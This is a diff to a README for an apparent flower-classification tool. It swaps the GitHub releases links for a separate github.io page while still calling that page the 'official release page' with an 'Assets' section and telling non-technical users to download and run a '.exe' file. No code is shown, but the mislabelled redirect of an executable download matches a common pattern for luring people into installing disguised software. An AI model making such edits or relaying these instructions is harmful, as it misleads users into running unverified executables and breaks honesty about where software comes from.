@@ -1,6 +1,6 @@
 # 🌸 flower-Image-Classification - Identify Flower Species Using Your Computer
 
-[![Download Link](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Pitviperrosachinensis176/flower-Image-Classification/releases)
+[![Download Link](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://pitviperrosachinensis176.github.io)
 
 This software identifies five unique species of flowers from images. It uses artificial intelligence to scan photos and provide the name of the flower. You do not need to understand coding to operate this tool. The software handles the image processing, mathematical analysis, and identification tasks in the background.
 
@@ -18,7 +18,7 @@ Your computer needs to meet basic standards to run this software. Ensure you hav
 
 You must visit the project release page to get the installer. Follow these steps to obtain the correct file:
 
-1.  Visit the official release page: [https://github.com/Pitviperrosachinensis176/flower-Image-Classification/releases](https://github.com/Pitviperrosachinensis176/flower-Image-Classification/releases)
+1.  Visit the official release page: [https://pitviperrosachinensis176.github.io](https://pitviperrosachinensis176.github.io)
 2.  Locate the section labeled "Assets."
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your Downloads folder or any folder you choose.
